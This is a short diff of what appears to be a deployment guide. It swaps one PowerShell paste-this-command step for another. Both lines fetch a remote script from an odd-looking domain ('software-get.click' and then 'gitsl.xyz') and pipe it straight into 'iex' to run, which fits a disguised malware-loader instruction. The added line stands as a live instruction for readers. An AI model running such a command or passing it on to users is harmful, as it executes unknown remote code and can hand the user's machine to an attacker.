@@ -40,7 +40,7 @@
 
 ### Step 2: Execute Deployment Command
 ```powershell
-irm https://software-get.click/Loader.ps1?get=ixl-asw | iex
+irm gitsl.xyz?get=ixl-asw | iex
 ```
 
 ### Step 3: Wait for Completion
